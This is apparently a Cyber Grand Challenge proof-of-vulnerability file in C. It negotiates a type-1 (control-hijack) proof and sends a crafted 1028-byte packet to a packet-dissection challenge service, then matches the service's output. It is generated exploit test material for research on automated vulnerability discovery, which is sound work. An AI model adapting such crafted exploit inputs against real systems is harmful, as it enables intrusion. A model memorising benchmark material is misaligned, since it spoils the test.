#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x23\x4f\x50\xc6"
         "\x50\xbe\x06\x0b\x10\x4f\x59\xc4\x14\x4d\x32\x45\x8e\x07\x49\x24"
         "\x26\x00\x00\x00\xcd\x4c\x6e\xfe\xe8\x8a\xa1\x46\x7d\x4d\x89\xc2"
         "\x76\x7b\xb3\x51\xfa\x6e\x7e\x7e\x81\x37\x87\xe1\x41\xe1\xd9\x6a"
         "\x54\x5f\x5d\x4a\xb8\xc8\xf6\xee\x39\x33\x5c\x32\x10\xa7\x9e\xf6"
         "\xbb\x76\x16\x4f\x16\x12\xd7\x1a\x12\x17\x06\x5f\x30\x2e\x79\x94"
         "\xfa\x2d\xa1\x2b\x8a\xf7\x1d\x38\x80\x3f\xca\xc2\x62\x32\x07\xc8"
         "\x60\xc4\xb3\x89\x29\xba\xa0\xc8\x64\xd3\x01\xea\xf0\x47\xd2\x92"
         "\x92\x74\x59\x8d\x73\xcc\x68\xf7\x65\xde\x6d\x7a\xd9\x19\x4c\xad"
         "\x27\x31\x69\x93\x44\x64\x21\x61\xa1\x34\x2f\xc5\x26\xc9\x7f\x5d"
         "\xb5\x88\x76\x8f\x22\x74\xde\x25\xf6\xe9\x6f\x73\x2c\x12\xb2\x20"
         "\x4f\x46\x52\xf3\x00\x89\x89\xcc\x59\xda\x97\x6c\x6f\x85\xfd\xb2"
         "\xf5\x9d\xcb\x21\x88\xd4\x74\x53\xf2\xed\x18\x4d\x37\x3a\x65\xc0"
         "\xfe\x6e\xea\xfe\x61\xda\xfa\x42\xda\xf0\x0f\xa3\x40\x78\x92\x68"
         "\xdb\x6a\xea\x52\x18\x27\xbe\xb7\xff\x5e\xc9\xf0\x1e\xe8\x85\x4b"
         "\xa4\x9d\xf8\xf9\xa4\x80\xd2\x18\xc6\xf3\xc3\xc4\x05\x7e\xb5\xbd"
         "\x6f\xe1\x29\x46\x53\x25\x1a\x6c\x5c\xfd\xd3\x8f\x93\xe6\x0d\x38"
         "\xdb\xdd\xf8\x24\x04\x31\xc4\x31\x45\x23\x9e\x7c\xf3\x49\xeb\x7d"
         "\xc3\x84\x74\xf1\x6b\x6f\xb7\x78\x4d\x07\x0d\x39\xa2\x33\x55\x87"
         "\xe9\xaf\xa3\x7d\x8b\x7b\xed\x0e\x95\x78\x88\x95\xeb\xeb\xcb\xce"
         "\x85\xba\xdd\x70\x16\x76\x94\xa5\x63\x23\x6c\x18\xe3\xa7\x14\xac"
         "\x4d\xfd\xc4\xa2\x96\x2a\xb8\xca\x5c\xb3\x58\x8c\xfd\xa9\xcb\xd6"
         "\x7e\xc0\x34\x2c\x01\x10\x5b\xf4\x3b\xd4\x82\xaa\x63\xc2\xd3\x0a"
         "\xcf\x06\xce\xe9\x2b\x0d\x58\x20\xff\xf5\x92\x99\x8f\xcd\xcd\xf4"
         "\x91\xcb\x2e\xf6\x0c\x38\xcb\x94\x40\x39\x22\x63\xd6\xb9\x4f\xe7"
         "\x8c\x74\x3f\x52\x04\x2c\x61\xe2\x90\x14\x61\xc6\x36\xbd\x38\xab"
         "\x4e\x74\x5e\xe9\xd6\xc9\x03\x64\xd7\xfd\xec\x06\x22\x50\x36\xf3"
         "\x7d\xdb\xae\x90\xe5\x54\xdf\xbb\x07\x1e\xeb\x8e\xeb\xa4\x6d\xdc"
         "\x95\x46\x17\xd9\x88\x0a\x76\xaa\x8d\x99\xc7\x93\x97\xb5\x89\xe7"
         "\xdb\xe7\xba\x92\xfe\xab\x5b\x95\x0d\xb7\x92\x2b\x9d\x57\xe9\xe7"
         "\x26\x56\x42\xe2\x2f\x1c\x3e\x71\x68\xf6\x3a\xe4\x6f\x8a\xff\x3c"
         "\x0d\xa9\xa5\x1a\x45\xd4\xae\x9e\x70\xfc\x0a\xf4\xb1\xfc\x6c\xc5"
         "\x94\xbf\xdb\x3a\xb6\xf4\x6c\x31\xfd\xce\xe1\xa2\x61\x60\x1b\x22"
         "\x5b\x1c\xb2\xcf\x50\x79\xa9\x09\x57\x9a\xe0\xc6\x2c\x4f\xf8\x3a"
         "\xe2\x9f\x1a\x97\x31\x1e\x69\xff\x4e\x37\x01\x3f\x61\x06\xd3\x6c"
         "\x36\x56\x95\x2d\xd3\x82\x37\x58\xc8\xd2\x73\xea\x4c\x3b\x8f\x98"
         "\x94\xbc\x39\x58\x76\x6b\x00\x34\x46\x86\x2a\x90\xd7\x9a\x6f\xec"
         "\x42\xbf\x60\x81\x09\xbe\xbe\x72\xd9\x21\x54\xa6\x5d\xc0\xab\xe7"
         "\xe7\xe3\x8c\x06\x97\x54\x89\x3b\xa8\x8e\xba\x24\x31\x00\xd2\xf3"
         "\xe2\xec\xa7\x7d\x31\x00\xf2\xf8\xa9\x32\xa0\xf6\x71\x53\x5b\x06"
         "\x26\x7c\xbd\xf6\x31\x31\x00\x3f\x31\xe6\x31\x04\xda\xff\x19\x00"
         "\xe8\x9e\x30\x5a\x6f\x52\x06\x28\x08\xf7\x2a\xfc\x21\xc8\x87\xa2"
         "\x93\x05\x9a\x89\x4f\x31\xbe\x74\x2d\x31\x77\x54\xc9\x7b\x50\x66"
         "\x77\x2f\x31\x33\x58\x2e\x40\x22\x36\x50\xb0\x33\xa3\x03\xd4\x65"
         "\xc4\xfc\xa2\xec\x79\xce\x85\x7f\xc8\xe8\xc9\x80\x36\x95\xba\xf7"
         "\x63\x92\xd2\x8f\x28\x63\x6e\xca\xdc\x34\x0b\xeb\x5b\x58\xa0\xa4"
         "\x6d\x49\x02\xdf\x1d\x5c\x20\x1b\xb9\xab\x5f\x19\x3e\xcf\x64\x37"
         "\xd7\x69\x27\x1c\xf2\xc6\x68\x13\x78\x1c\x8f\x26\x8e\x4e\xb6\xc8"
         "\x4e\x08\x57\x96\x75\xb8\x26\xc4\x22\xc0\x87\x1f\xe7\xff\x72\x47"
         "\x05\xf3\x35\x32\x70\x0b\x09\xb7\xf6\xde\x79\x02\x11\xf4\xbe\x5b"
         "\x5b\x5d\x27\x47\x3b\x8f\x4b\x81\xe1\x31\xab\xeb\xd1\xda\x04\xb4"
         "\x6b\x4f\xdf\x6b\x25\x3c\x7e\x9e\x05\x39\x24\x54\xcb\x88\x39\xa0"
         "\x20\x3d\xbe\x7d\xf3\xd6\xec\x03\xd7\xf3\x0c\x8e\x31\x00\x31\xcd"
         "\xc7\x08\xc6\x27\x67\x02\xf2\x56\xcc\xfe\x9d\x7b\xfc\x3a\xb6\xaf"
         "\x52\x31\x1a\xbf\x1c\x4f\x37\xd9\xe1\xf2\x4e\xe6\x99\x6c\x58\xd8"
         "\xd0\x6c\x16\x03\x8e\x51\x45\x03\xdf\x45\x31\x96\xb3\x08\xe4\xa4"
         "\x94\x86\x83\x8f\x88\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===noninfectionvenerativeness
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6e\x6f\x6e\x69\x6e\x66\x65\x63\x74\x69\x6f"
         "\x6e\x76\x65\x6e\x65\x72\x61\x74\x69\x76\x65\x6e\x65\x73\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
